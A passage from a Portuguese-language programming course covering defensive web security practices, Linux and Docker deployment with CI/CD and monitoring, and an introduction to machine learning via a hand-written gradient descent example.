**O mesmo vale para campos.** Se o usuário pode editar o próprio perfil, ele não pode editar o campo `is_admin` — mesmo que ele mande esse campo no JSON. Aceite explicitamente só os campos permitidos, nunca repasse o corpo inteiro para o banco.

---

## Nível Avançado

### Aula 10.8 — Segredos e configuração

Segredo é chave de API, senha de banco, token, chave de assinatura. Duas regras:

**1. Nunca no código.** Nem em constante, nem em comentário, nem "temporariamente".

```python
# ERRADO
API_KEY = "sk-proj-abc123..."

# CORRETO
import os
API_KEY = os.environ["API_KEY"]        # falha alto se não existir
```

Prefira `os.environ["X"]` a `os.environ.get("X")`: o primeiro derruba a aplicação na hora se faltar configuração, o segundo segue com `None` e você descobre em produção.

**2. Nunca no Git.** O `.env` fica no `.gitignore`, sempre, e você versiona um `.env.example` sem valores:

```bash
# .env.example — este vai para o Git
DATABASE_URL=postgresql://usuario:senha@localhost/banco
API_KEY=
JWT_SECRET=
```

O Módulo 8 explicou por que apagar depois não resolve: o histórico guarda. Se vazou, **invalide a chave primeiro** — o resto é limpeza.

**Configuração por ambiente:** desenvolvimento, homologação e produção têm valores diferentes e **segredos diferentes**. A chave de teste jamais é a de produção. Em produção, use o cofre da plataforma (variáveis do provedor, AWS Secrets Manager, Vault) em vez de arquivo no disco.

E uma que passa despercebida: **mensagem de erro é vazamento**. Em produção, `DEBUG = False`. A página de erro detalhada do Django ou do Flask mostra caminho de arquivo, trecho de código e, às vezes, variáveis de ambiente na tela.

### Aula 10.9 — HTTPS, CORS e cabeçalhos

**HTTPS não é opcional.** Sem ele, qualquer um no caminho — o Wi-Fi do café, o provedor — lê e altera o tráfego. Hoje é gratuito via Let's Encrypt e automático na maioria das hospedagens. Redirecione todo HTTP para HTTPS, e ligue HSTS para o navegador nem tentar a versão insegura.

**CORS** é o mais incompreendido da web. Ele **não protege seu servidor** — protege o *usuário*, impedindo que o site A leia, pelo navegador dele, a resposta de uma API B onde ele está logado.

Por isso o erro de CORS aparece: você tentou acessar uma API de outra origem e o navegador bloqueou a leitura da resposta.

```python
# ERRADO — libera para qualquer site
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True)

# CORRETO — liste quem pode
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://meusite.com"],
    allow_credentials=True,
)
```

`allow_origins=["*"]` junto com `allow_credentials=True` é uma combinação que os navegadores recusam, justamente por ser perigosa. Se você chegou a essa configuração tentando fazer o erro sumir, você desligou a proteção em vez de configurá-la.

**Cabeçalhos que valem ligar:**

| Cabeçalho | Faz |
|-----------|-----|
| `Content-Security-Policy` | Limita de onde script pode vir — a melhor defesa contra XSS |
| `Strict-Transport-Security` | Força HTTPS |
| `X-Content-Type-Options: nosniff` | Impede o navegador de adivinhar o tipo do arquivo |
| `X-Frame-Options: DENY` | Impede seu site de ser embutido em iframe (*clickjacking*) |

**Limite de taxa** (*rate limiting*) fecha a lista: sem ele, o atacante testa senha à vontade e qualquer robô derruba seu servidor.

### Aula 10.10 — Dependências

Seu código pode estar impecável e a aplicação vulnerável — porque 90% do que roda em produção você não escreveu.

```bash
npm audit                  # lista vulnerabilidades conhecidas
npm audit fix

pip install pip-audit
pip-audit
```

Ligue o **Dependabot** no GitHub: ele abre Pull Request automático quando sai correção de segurança das suas dependências. É gratuito e leva dois minutos.

**Antes de instalar um pacote**, gaste trinta segundos: quantos downloads tem? A última publicação é recente? Quantos mantenedores? Um pacote com 40 downloads semanais e um único mantenedor é risco — não porque a pessoa seja má, mas porque uma conta comprometida vira código malicioso na sua máquina e na sua produção.

**Versione o arquivo de trava** (`package-lock.json`, `poetry.lock`). Ele garante que produção instale exatamente o que você testou, e não uma versão nova publicada ontem.

E cuidado com o nome: **typosquatting** é publicar `requets` esperando o erro de digitação de quem quis `requests`. Confira o que você digitou antes de instalar.

### Aula 10.11 — Como continuar

O **OWASP Top 10** é a lista de referência das falhas mais críticas em aplicação web, revisada periodicamente por gente que faz isso profissionalmente. Você já viu as principais neste módulo — controle de acesso quebrado, injeção, falha de identificação, componente vulnerável, configuração insegura.

Leia a lista completa em [owasp.org/Top10](https://owasp.org/www-project-top-ten/). Não decore: use como checklist ao revisar seu próprio projeto.

**Hábitos que valem mais que conhecimento pontual:**

- Rode `npm audit` / `pip-audit` antes de todo deploy
- Revise o próprio código perguntando *"o que acontece se este campo vier com algo hostil?"*
- Nunca desligue proteção do framework para fazer um erro sumir — entenda por que ela disparou
- Trate relato de falha com seriedade, mesmo vindo de estranho

**Sobre praticar ataque:** só em ambiente feito para isso. [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) e [PortSwigger Web Security Academy](https://portswigger.net/web-security) são aplicações vulneráveis de propósito, gratuitas, para você explorar à vontade e entender o outro lado.

**Testar sistema de terceiro sem autorização por escrito é crime** no Brasil, com pena prevista em lei. A curiosidade é legítima; o alvo tem que ser seu ou de um programa que autorize.

---

## Projetos do Módulo 10

**Projeto 1 — Ataque e conserte seu próprio código**
Pegue a API que você fez no Módulo 4 ou 5 e escreva-a de propósito com SQL injection, XSS e IDOR. **Explore cada uma** com `curl`, guardando o antes. Depois corrija as três e demonstre que o mesmo ataque falhou. Entregue um relatório curto com o comando usado, o resultado antes e o resultado depois. Ver a falha funcionando ensina o que nenhuma explicação ensina.

**Projeto 2 — Autenticação feita direito**
Cadastro e login com bcrypt e sal, limite de tentativas com espera crescente, sessão ou JWT com expiração curta, recuperação de senha por link de uso único e prazo, e verificação de posse em toda rota que recebe id. Teste tentando acessar o recurso de outro usuário.

**Projeto 3 — Revisão de segurança**
Escolha um projeto seu já pronto e faça uma auditoria escrita usando o OWASP Top 10 como roteiro. Para cada item: aplica-se? Está protegido? Como você verificou? Corrija o que achar e registre. Este relatório é material de entrevista — poucos júniores têm um.

---

## Checklist de saída do Módulo 10

- [ ] Explico por que validação no navegador não é segurança
- [ ] Escrevo SQL com parâmetros e sei explicar por que isso impede injeção
- [ ] Sei a diferença entre `innerHTML` e `textContent` como questão de segurança
- [ ] Explico como um CSRF funciona e as três defesas
- [ ] Uso bcrypt ou argon2 e sei por que SHA-256 não serve para senha
- [ ] Sei o que é IDOR e verifico posse em toda rota com id
- [ ] Sei por que devolver 404 em vez de 403 em recurso alheio
- [ ] Nenhum segredo meu está no Git, e sei o que fazer se vazar
- [ ] Sei o que CORS protege — e o que ele não protege
- [ ] Rodo auditoria de dependências antes de publicar

---

# MÓDULO 11 — Colocar no Ar

> **Dificuldade:** ●●●○○ · **Tempo:** 6 a 8 semanas · **Pré-requisito:** Módulos 4, 8 e 10

**Objetivo:** transformar um projeto que roda na sua máquina em um sistema que roda sozinho, para outras pessoas, sem você.

Existe um abismo entre *"terminei o projeto"* e *"o projeto está no ar"*. É nesse abismo que a maioria dos autodidatas empaca — e é exatamente ele que separa o portfólio de quem é contratado do portfólio que é só uma pasta no computador.

Este módulo atravessa esse abismo. Ele é menos sobre programar e mais sobre a **realidade em volta do código**: onde ele roda, como sobe, o que fazer quando cai às três da manhã.

**Uma nota sobre nomes:** *DevOps* e *SRE* são os cargos que fazem isso em tempo integral. Você não precisa virar um. Mas todo desenvolvedor precisa saber colocar a própria aplicação no ar, ler um log e desfazer um deploy ruim — e hoje isso é filtro de contratação.

**Ferramentas:** Linux (no Windows, use o WSL2), Docker, uma conta no GitHub e uma hospedagem gratuita para testar.

---

## Nível Básico

### Aula 11.1 — Por que "roda na minha máquina" não basta

Você termina o projeto, manda para um amigo, e ele não consegue rodar. A lista de motivos é sempre a mesma:

| O que difere | Exemplo |
|--------------|---------|
| Versão da linguagem | Você tem Python 3.12, ele tem 3.9 |
| Dependências | Você instalou algo há meses e esqueceu |
| Variáveis de ambiente | O `.env` não foi junto (e nem devia) |
| Sistema operacional | Caminho com `\` contra `/` |
| Serviços externos | Seu Postgres roda local; o dele não existe |
| Arquivo esquecido | Está no seu disco, nunca entrou no Git |

Colocar no ar é resolver todos esses de uma vez, e de forma **repetível** — porque você vai fazer isso de novo toda semana.

O caminho tem três degraus, e este módulo sobe os três:

```
1. Entender a máquina        → Linux, terminal, processos, portas
2. Empacotar a aplicação     → Docker: leva o ambiente junto
3. Automatizar a subida      → CI/CD: um push publica sozinho
```

### Aula 11.2 — Linux: o mínimo que você precisa

Praticamente todo servidor do mundo roda Linux. Você não precisa dominá-lo, mas precisa se virar.

**A árvore de diretórios**, e o que importa em cada um:

```
/               raiz de tudo
├── home/       pastas dos usuários       ← seu projeto costuma ficar aqui
├── etc/        arquivos de configuração  ← config de serviços
├── var/
│   └── log/    logs do sistema           ← onde você olha quando quebra
├── usr/        programas instalados
├── tmp/        temporários, some ao reiniciar
└── opt/        programas de terceiros
```

Não há letra de unidade: tudo pendura na `/`. Um pendrive vira `/media/pendrive`.

**Permissões** — a fonte de metade dos "Permission denied":

```bash
ls -l
-rw-r--r--  1 lucas  users   2048  arquivo.txt
drwxr-xr-x  2 lucas  users   4096  pasta/
│└┬┘└┬┘└┬┘
│ │  │  └── outros:    r--  (só leitura)
│ │  └───── grupo:     r--  (só leitura)
│ └──────── dono:      rw-  (leitura e escrita)
└────────── tipo:      -  arquivo   d  diretório
```

Cada trio é **r** (ler), **w** (escrever), **x** (executar). Em número, `r=4`, `w=2`, `x=1`, somados por trio:

```bash
chmod 755 script.sh    # dono: 7 (rwx), grupo e outros: 5 (r-x)
chmod 644 arquivo.txt  # dono: 6 (rw-), demais: 4 (r--)
chmod 600 .env         # SÓ o dono lê e escreve  ← use isto em segredo
chmod +x script.sh     # atalho: torna executável
```

**Nunca use `chmod 777`.** Ele libera tudo para todo mundo, e é a "solução" que aparece em fórum quando alguém não quer entender o problema. Em servidor exposto, é convite.

**Usuário e `sudo`:** o `root` pode tudo, inclusive destruir o sistema. O certo é trabalhar como usuário comum e usar `sudo` pontualmente. **Nunca rode sua aplicação como root** — se ela for comprometida, o atacante herda esse poder.

### Aula 11.3 — Terminal: o que resolve 90%

```bash
# Navegar
pwd                     # onde estou
ls -la                  # lista tudo, com detalhes
cd /var/log             # entra
cd ..                   # sobe um nível
cd ~                    # vai para a pasta do usuário

# Arquivos
cat arquivo.txt         # mostra tudo
less arquivo.txt        # abre paginado (q para sair) — use em arquivo grande
head -20 arquivo.txt    # primeiras 20 linhas
tail -20 arquivo.txt    # últimas 20
tail -f app.log         # ACOMPANHA em tempo real ← o mais usado em produção

cp origem destino
mv origem destino       # move ou renomeia
rm arquivo
rm -rf pasta/           # apaga recursivamente, sem perguntar — cuidado
mkdir -p a/b/c          # cria a árvore inteira

# Procurar
grep "ERROR" app.log            # linhas que contêm
grep -r "senha" .               # recursivo, em toda a pasta
grep -i "erro" app.log          # ignora maiúscula
find . -name "*.log"            # acha arquivos por nome

# Espaço em disco (o "por que o servidor parou")
df -h                   # espaço por partição
du -sh *                # tamanho de cada item da pasta atual
```

**Canos e redirecionamento** — a ideia que torna o terminal poderoso:

```bash
comando > arquivo       # escreve a saída no arquivo (SOBRESCREVE)
comando >> arquivo      # acrescenta ao fim
comando 2> erros.txt    # redireciona só os erros
comando | outro         # a saída de um vira a entrada do outro
```

O cano encadeia programas pequenos para responder perguntas específicas:

```bash
# Os 10 IPs que mais aparecem no log de acesso
cat acesso.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -10
```

Lendo da esquerda para a direita: mostra o arquivo, pega a primeira coluna (o IP), ordena, conta as repetições, ordena pela contagem decrescente, pega os dez primeiros. Nenhum desses programas sabe da existência dos outros — e juntos respondem uma pergunta real.

**Essa é a filosofia do Unix:** programas pequenos que fazem uma coisa bem e se encaixam. É o mesmo princípio do "uma função faz uma coisa só" do Módulo 0, aplicado a programas inteiros.

### Aula 11.4 — Processos, portas e logs

**Processos** — o que está rodando:

```bash
ps aux | grep python        # acha seu processo
top                         # monitor em tempo real (q sai)
htop                        # versão melhor, se instalada

kill 12345                  # pede para o processo 12345 encerrar
kill -9 12345               # força — só se o anterior não funcionar
```

**Portas** — onde sua aplicação escuta:

```bash
ss -tulpn | grep 8000       # quem está usando a porta 8000
```

Isso responde o erro que você mais vai ver ao subir servidor: `Address already in use` significa que **outra coisa já ocupa a porta** — quase sempre uma execução anterior sua que não morreu.

Portas abaixo de 1024 (80 para HTTP, 443 para HTTPS) exigem privilégio. Por isso a aplicação roda numa porta alta, como 8000, e um servidor web na frente recebe na 80/443 e repassa. Esse intermediário é o **proxy reverso**, normalmente **Nginx**:

```
Internet → Nginx (443, HTTPS) → sua aplicação (8000, local)
```

Além de resolver a porta, ele cuida do certificado HTTPS, serve arquivos estáticos e distribui carga entre instâncias.

**Logs** — sua única visão do que aconteceu:

```bash
tail -f /var/log/nginx/error.log        # acompanha ao vivo
journalctl -u minhaapp -f               # log de um serviço (systemd)
journalctl -u minhaapp --since "1 hour ago"
```

**Escreva log de verdade na sua aplicação.** `print()` não é log:

```python
import logging

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s %(message)s",
)
log = logging.getLogger(__name__)

log.info("Pedido criado", extra={"pedido_id": 123, "usuario_id": 45})
log.error("Falha ao cobrar", exc_info=True)     # inclui o traceback
```

Três regras que você vai agradecer às três da manhã:

- **Nível certo:** `DEBUG` para investigar, `INFO` para eventos de negócio, `WARNING` para o que é estranho mas seguiu, `ERROR` para o que falhou.
- **Contexto junto.** "Erro ao salvar" não ajuda. "Erro ao salvar pedido 123 do usuário 45" resolve.
- **Nunca registre segredo.** Senha, token e cartão em log é vazamento — e log costuma ir para serviço de terceiros.

---

## Nível Intermediário

### Aula 11.5 — SSH: trabalhando em máquina remota

```bash
ssh usuario@203.0.113.10           # conecta
ssh -p 2222 usuario@servidor.com   # porta diferente

scp arquivo.txt usuario@servidor:/home/usuario/    # envia um arquivo
scp -r pasta/ usuario@servidor:/home/usuario/      # envia uma pasta
```

**Use chave, não senha.** É mais seguro e mais prático:

```bash
ssh-keygen -t ed25519 -C "seu@email.com"    # gera o par
ssh-copy-id usuario@servidor                # instala a pública no servidor
```

Ficam dois arquivos: `id_ed25519` (**privada** — nunca sai da sua máquina, nunca vai para o Git) e `id_ed25519.pub` (**pública** — essa você distribui). O servidor guarda a pública; só quem tem a privada correspondente entra.

É a mesma chave que você usa para autenticar no GitHub via SSH.

**Endurecendo o servidor** — em `/etc/ssh/sshd_config`:

```
PermitRootLogin no
PasswordAuthentication no      # só chave
```

Servidor exposto na internet recebe tentativas de login automatizadas em **minutos**. Desligar senha elimina esse ataque inteiro de uma vez.

**Um detalhe que pega todo iniciante:** ao fechar a conexão SSH, tudo que você iniciou morre junto. Para deixar rodando, use um serviço do sistema (`systemd`) ou um multiplexador como `tmux`.

### Aula 11.6 — Docker: o problema que ele resolve

Volte à lista da Aula 11.1: versão diferente, dependência faltando, sistema diferente. Docker resolve **todos** de uma vez, empacotando a aplicação **junto com o ambiente inteiro**.

```
Sem Docker: "instale Python 3.12, o Postgres 16, estas 40 bibliotecas,
             configure isto, aquilo…"  → e ainda assim quebra

Com Docker: "docker run minha-app"     → roda igual em qualquer lugar
```

Dois conceitos, e confundi-los atrapalha tudo:

- **Imagem** — o molde, imutável. É a receita e os ingredientes.
- **Contêiner** — uma execução daquela imagem. Do mesmo molde saem quantos você quiser.

A relação é a de classe e objeto, do Módulo 5: a imagem é a classe, o contêiner é a instância.

**Contêiner não é máquina virtual.** A VM carrega um sistema operacional inteiro — pesa gigabytes e leva minutos para subir. O contêiner compartilha o núcleo do sistema hospedeiro e isola só o resto: pesa megabytes e sobe em segundos. É essa diferença que tornou possível ter dezenas deles na mesma máquina.

```bash
docker ps                     # contêineres rodando
docker ps -a                  # todos, inclusive parados
docker images                 # imagens baixadas

docker run -p 8000:8000 minha-app     # roda, publicando a porta
docker logs -f meu-container          # acompanha o log
docker exec -it meu-container bash     # abre um terminal DENTRO dele
docker stop meu-container
```

O `docker exec -it ... bash` é a ferramenta de depuração mais útil do conjunto: ele te coloca dentro do contêiner, onde você investiga com os comandos da Aula 11.3.

### Aula 11.7 — Dockerfile

O Dockerfile é a receita da imagem:

```dockerfile
FROM python:3.12-slim

WORKDIR /app

# Dependências primeiro, código depois — a ordem importa (explicação abaixo)
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

# Usuário sem privilégio: nunca rode como root (Aula 11.2)
RUN useradd -m app && chown -R app:app /app
USER app

EXPOSE 8000
CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
```

```bash
docker build -t minha-app .
docker run -p 8000:8000 --env-file .env minha-app
```

**Por que copiar o `requirements.txt` antes do código.** Cada linha do Dockerfile vira uma camada em cache. Se nada mudou numa camada, o Docker reaproveita.

Como o código muda a cada commit e as dependências quase nunca, separar os dois faz o `pip install` — a parte lenta — ser reaproveitado. Junte tudo num `COPY . .` só, e cada alteração de uma vírgula reinstala tudo. **A diferença é de três minutos para três segundos** por build.

**Cuidados que separam Dockerfile de curso de Dockerfile de produção:**

- Use a variante `-slim` ou `alpine`: imagem menor sobe mais rápido e tem menos superfície de ataque
- Fixe a versão base (`python:3.12-slim`, nunca `python:latest`) — senão seu build muda sozinho
- Crie um `.dockerignore` (mesma ideia do `.gitignore`) para não copiar `.git`, `venv` e `node_modules`
- **Nunca ponha segredo no Dockerfile.** Ele fica gravado nas camadas da imagem, e quem tiver a imagem lê. Segredo entra em tempo de execução, por variável de ambiente.

### Aula 11.8 — Docker Compose

Aplicação real não é um contêiner só: tem banco, cache, a aplicação. O Compose descreve o conjunto num arquivo:

```yaml
services:
  app:
    build: .
    ports:
      - "8000:8000"
    environment:
      DATABASE_URL: postgresql://postgres:senha@db:5432/meubanco
      REDIS_URL: redis://cache:6379
    depends_on:
      - db
      - cache

  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_PASSWORD: senha
      POSTGRES_DB: meubanco
    volumes:
      - dados_db:/var/lib/postgresql/data

  cache:
    image: redis:7-alpine

volumes:
  dados_db:
```

```bash
docker compose up -d        # sobe tudo em segundo plano
docker compose logs -f app  # acompanha o log de um serviço
docker compose down         # derruba tudo
```

Dois detalhes que resolvem as dúvidas mais comuns:

**Os serviços se acham pelo nome.** Repare no `DATABASE_URL`: o host é `db`, não `localhost`. Dentro da rede do Compose, o nome do serviço vira o endereço. Usar `localhost` ali aponta para o próprio contêiner da aplicação, e é o erro nº 1 de quem começa.

**Volume é o que sobrevive.** Contêiner é descartável: derrubou, perdeu tudo que estava dentro. O `volumes: dados_db:` guarda os dados do Postgres fora dele, então `docker compose down` seguido de `up` não apaga seu banco.

O Compose também resolve o onboarding de equipe: quem entra no projeto roda `docker compose up` e tem o ambiente inteiro em minutos, em vez de um dia seguindo README.

---

## Nível Avançado

### Aula 11.9 — Onde hospedar

| Opção | O que você gerencia | Custo | Bom para |
|-------|---------------------|-------|----------|
| **Hospedagem estática** (GitHub Pages, Netlify, Vercel) | Nada | Grátis no básico | Site estático, front-end |
| **PaaS** (Railway, Render, Fly.io) | Só o código | Grátis a US$ 5-20/mês | **Comece aqui** |
| **VPS** (DigitalOcean, Hetzner, Contabo) | O servidor inteiro | US$ 4-10/mês | Aprender de verdade, controle |
| **Nuvem** (AWS, GCP, Azure) | Muita coisa | Variável, complexo | Escala, empresa |

**Comece por PaaS.** Você conecta o repositório, ele detecta a linguagem, sobe e te dá uma URL com HTTPS. O deploy vira `git push`.

**Depois monte um VPS**, mesmo que só uma vez. Instalar Linux, configurar Nginx, obter certificado com Let's Encrypt e criar o serviço no systemd te ensina o que a PaaS esconde. Sem isso você fica dependente da mágica alheia.

**Deixe a nuvem grande para quando precisar.** AWS tem duzentos serviços, e a maior parte dos projetos júnior não precisa de nenhum. Complexidade que você não precisa é custo — de dinheiro e de tempo.

**O que quase todo projeto precisa, independente de onde:**

- Domínio próprio (uns R$ 40/ano) e HTTPS
- Banco gerenciado, com backup automático — perder dado de cliente não tem volta
- Variáveis de ambiente configuradas na plataforma, não em arquivo
- Logs acessíveis sem precisar entrar no servidor

### Aula 11.10 — CI/CD com GitHub Actions

**Integração contínua** (CI) roda testes automaticamente a cada push. **Entrega contínua** (CD) publica sozinha quando passa.

```yaml
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
  pull_request:

jobs:
  testes:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Instalar dependências
        run: pip install -r requirements.txt

      - name: Rodar testes
        run: pytest

      - name: Auditar dependências
        run: pip-audit
```

A partir daí, todo push roda os testes, e todo Pull Request mostra se passou **antes** de alguém revisar. Combinado com a branch protegida do Módulo 8, código quebrado não entra na `main` — não por disciplina, mas porque o sistema não deixa.

Acrescentando o deploy automático:

```yaml
  publicar:
    needs: testes                                   # só roda se os testes passarem
    if: github.ref == 'refs/heads/main'             # só na main
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Publicar
        env:
          TOKEN: ${{ secrets.DEPLOY_TOKEN }}        # segredo do repositório
        run: ./deploy.sh
```

**Repare no `needs: testes`.** Sem essa linha, o deploy roda em paralelo com os testes e publica código quebrado. É a linha que transforma automação em rede de segurança.

Segredos vão em `Settings > Secrets` do repositório, e o Actions os mascara no log automaticamente — nunca no arquivo YAML, que está no Git.

**O que colocar no CI, em ordem de retorno:** testes, lint, auditoria de dependência (Módulo 10), e build da imagem Docker.

### Aula 11.11 — Depois que subiu

Publicar é o começo. O sistema agora precisa continuar de pé.

**Monitoramento** — os quatro sinais que respondem "está tudo bem?":

| Sinal | Pergunta |
|-------|----------|
| **Latência** | Está lento? |
| **Tráfego** | Quanto está chegando? |
| **Erros** | Qual a taxa de falha? |
| **Saturação** | CPU, memória e disco estão no limite? |

Comece simples: um **healthcheck** e um serviço gratuito que o consulta:

```python
@app.get("/health")
def health():
    db.execute("SELECT 1")           # o banco responde?
    return {"status": "ok"}
```

Um monitor externo (UptimeRobot, BetterStack) bate nessa rota a cada minuto e te avisa quando parar de responder. Isso já te coloca à frente de muita gente — **o pior cenário é o cliente descobrir antes de você**.

**Rastreamento de erro:** Sentry (ou similar) captura exceção com traceback, requisição e usuário. Sem isso, "está dando erro" é tudo que você tem.

**Backup — e o teste do backup.** Backup de banco automático e diário, guardado em outro lugar. E aqui vai a parte que quase todo mundo pula:

> **Backup que nunca foi restaurado não é backup.** É uma esperança.

Restaure num ambiente de teste pelo menos uma vez. Descobrir que o backup está corrompido durante um incídente é uma experiência que ninguém precisa ter duas vezes.

**Rollback — a habilidade mais subestimada.** Quando o deploy quebra a produção, a resposta certa não é depurar com o site fora do ar: é **voltar para a versão anterior primeiro**, e investigar depois, com calma.

Para isso funcionar, três coisas precisam ser verdade:

- Deploy versionado, com a versão anterior a um comando de distância
- **Migração de banco compatível para trás** — se a versão nova apagou uma coluna, voltar o código não resolve. É por isso que se separa a migração da remoção em dois deploys.
- Alguém que saiba fazer isso sob pressão, porque já treinou

**A postura profissional que fecha o módulo:** todo sistema cai. O que separa o profissional do amador não é evitar a queda — é o tempo até perceber, a capacidade de voltar rápido, e escrever depois o que aconteceu e o que muda para não repetir. Sem procurar culpado: procurando a falha do processo que deixou aquilo acontecer.

---

## Projetos do Módulo 11

**Projeto 1 — Contêinerize o que você já tem**
Pegue sua API do Módulo 4 ou 5 e escreva o `Dockerfile` (com usuário sem privilégio e cache de camada bem ordenado) e o `docker-compose.yml` com aplicação e banco. **Critério:** alguém que só tenha Docker instalado clona seu repositório, roda `docker compose up` e tem tudo funcionando, sem ler README nenhum.

**Projeto 2 — Um VPS do zero, na mão**
Contrate a máquina mais barata que achar, e faça tudo pelo terminal: usuário sem privilégio, SSH só por chave, senha desligada, firewall, Nginx como proxy reverso, HTTPS com Let's Encrypt, e sua aplicação como serviço do systemd que sobe sozinha após reiniciar. **Reinicie o servidor e confirme que tudo voltou.** Documente cada passo — este documento vale mais que o certificado.

**Projeto 3 — Esteira completa com rollback ensaiado**
GitHub Actions rodando testes e auditoria em todo PR, deploy automático na `main` só com testes verdes, healthcheck monitorado por serviço externo, e rastreamento de erro ligado. Depois **quebre a produção de propósito** e execute o rollback, cronometrando. Escreva um relatório curto do incidente: o que quebrou, quanto tempo levou, o que muda. É o entregável que mais impressiona numa entrevista.

---

## Checklist de saída do Módulo 11

- [ ] Me viro no terminal Linux sem procurar comando básico
- [ ] Leio permissões em `ls -l` e sei por que `chmod 777` é errado
- [ ] Descubro quem está ocupando uma porta e mato o processo
- [ ] Uso `tail -f` e `grep` para investigar um problema em log
- [ ] Acesso servidor por SSH com chave, sem senha
- [ ] Explico a diferença entre imagem e contêiner
- [ ] Escrevo um Dockerfile com cache de camada na ordem certa
- [ ] Subo aplicação e banco juntos com Docker Compose
- [ ] Tenho pipeline que roda testes e só publica se passarem
- [ ] Minha aplicação tem healthcheck monitorado e rastreamento de erro
- [ ] Já executei um rollback e sei quanto tempo levo para fazê-lo

---

# MÓDULO 12 — Inteligência Artificial

> **Dificuldade:** ●●●○○ · **Tempo:** 8 a 10 semanas · **Pré-requisito:** Módulo 4 e Módulo 9

**Objetivo:** entender o que a máquina realmente faz quando "pensa", e construir software com IA sem virar refém dela.

Este módulo tem duas metades que não se separam. A primeira explica **como funciona por dentro** — rede neural, treino, transformer, token. A segunda ensina a **usar e construir** — API, embeddings, RAG, agentes.

Você pode achar que só precisa da segunda. É justamente o erro que este módulo quer evitar. Quem usa IA sem entender o mecanismo não sabe por que o modelo errou, acredita em resposta inventada, e escreve um sistema que funciona na demonstração e falha em produção. A teoria aqui não é enfeite acadêmico: é o que te deixa **desconfiar na hora certa**.

**Aviso honesto sobre este módulo:** a área muda rápido. Nomes de modelo, preço e limite mudam a cada poucos meses. Os **conceitos** abaixo — token, atenção, embedding, alucinação, RAG — são estáveis e vão continuar valendo. Quando o texto citar número concreto, trate como ordem de grandeza, não como verdade permanente.

**Ferramentas:** Python do Módulo 4, uma chave de API de algum provedor, e `pip install anthropic numpy scikit-learn`.

---

## Nível Básico

### Aula 12.1 — IA, aprendizado de máquina e aprendizado profundo

Três termos usados como sinônimos na imprensa. São três círculos, um dentro do outro:

```
┌──────────── INTELIGÊNCIA ARTIFICIAL ─────────────┐
│  Qualquer máquina que imita comportamento        │
│  inteligente. Inclui coisas sem aprendizado      │
│  nenhum, como um jogo de xadrez de regras.       │
│                                                  │
│  ┌──────── APRENDIZADO DE MÁQUINA ────────────┐  │
│  │  A máquina descobre as regras a partir     │  │
│  │  dos dados, em vez de você escrevê-las.    │  │
│  │                                            │  │
│  │  ┌──── APRENDIZADO PROFUNDO ───────────┐   │  │
│  │  │  Aprendizado de máquina usando       │   │  │
│  │  │  redes neurais de muitas camadas.    │   │  │
│  │  │  É onde vivem os LLMs.               │   │  │
│  │  └──────────────────────────────────────┘   │  │
│  └────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────┘
```

A diferença que importa é entre **programação comum** e **aprendizado de máquina**:

| | Programação comum | Aprendizado de máquina |
|---|---|---|
| Você fornece | Regras + dados | Dados + respostas |
| A máquina devolve | Respostas | **As regras** |

Pense em detectar spam. Na programação comum você escreve: *se contém "ganhe dinheiro" e tem três pontos de exclamação, é spam*. Você vai passar a vida acrescentando regra e os golpistas vão contorná-las.

No aprendizado de máquina você entrega 100 mil emails já marcados como spam ou não, e o programa **descobre sozinho** quais padrões separam um do outro. Você nunca escreve a regra — e nem consegue lê-la depois, o que é ao mesmo tempo a força e o problema desta abordagem.

### Aula 12.2 — Como uma máquina aprende

O exemplo mais simples que existe, e ele contém tudo: prever o preço de uma casa pelo tamanho.

Você tem dados reais:

| Tamanho (m²) | Preço (R$ mil) |
|--------------|----------------|
| 50 | 200 |
| 80 | 320 |
| 100 | 400 |
| 150 | 600 |

O modelo é uma reta: `preço = a × tamanho + b`. "Aprender" significa **achar o `a` e o `b`** que fazem a reta passar mais perto de todos os pontos.

Como a máquina acha? Assim:

1. **Chuta.** Começa com `a = 1` e `b = 0`. A reta fica péssima.
2. **Mede o erro.** Para cada casa, calcula o quanto errou. A soma dos erros ao quadrado é a **função de perda** (*loss*).
3. **Ajusta na direção que diminui o erro.** Se prever baixo demais, aumenta o `a` um pouco.
4. **Repete** milhares de vezes.

Esse passo 3 tem nome: **gradiente descendente**. A imagem mental é a de estar num vale com neblina — você não vê o fundo, mas sente a inclinação sob os pés e dá um passo para baixo. Repetindo, chega ao fundo.

```python
# Aprendizado, sem biblioteca nenhuma
tamanhos = [50, 80, 100, 150]
precos   = [200, 320, 400, 600]

a, b = 1.0, 0.0
taxa = 0.00001          # tamanho do passo

for epoca in range(10000):
    # o que o modelo prevê hoje
    previsoes = [a * t + b for t in tamanhos]

    # o quanto errou em cada casa
    erros = [p - real for p, real in zip(previsoes, precos)]

    # ajusta a e b na direção que reduz o erro
    grad_a = sum(e * t for e, t in zip(erros, tamanhos)) / len(erros)
    grad_b = sum(erros) / len(erros)

    a -= taxa * grad_a
    b -= taxa * grad_b

print(f"preço ≈ {a:.2f} × tamanho + {b:.2f}")
# preço ≈ 4.00 × tamanho + 0.03   → cerca de R$ 4 mil por m²
```

O `a` chegou em 4,00 porque os dados foram construídos assim: todas as casas custam exatamente R$ 4 mil por m². O `b` parou em 0,03 em vez de zero cravado — ele ainda estava descendo a ladeira quando as 10 mil voltas acabaram. Aumente as épocas e ele se aproxima mais de zero.

Rode isso. São vinte linhas, sem biblioteca, e é **literalmente** o mesmo mecanismo que treina um modelo de bilhões de parâmetros. A diferença é escala: em vez de dois números (`a` e `b`), são bilhões; em vez de uma reta, uma função com bilhões de dobras. O laço é o mesmo: prever, medir erro, ajustar, repetir.

**Guarde esta frase:** treinar é procurar os números que minimizam o erro. Só isso. Não há compreensão, intenção nem raciocínio no processo — há uma descida de ladeira, repetida bilhões de vezes.

### Aula 12.3 — A rede neural por dentro

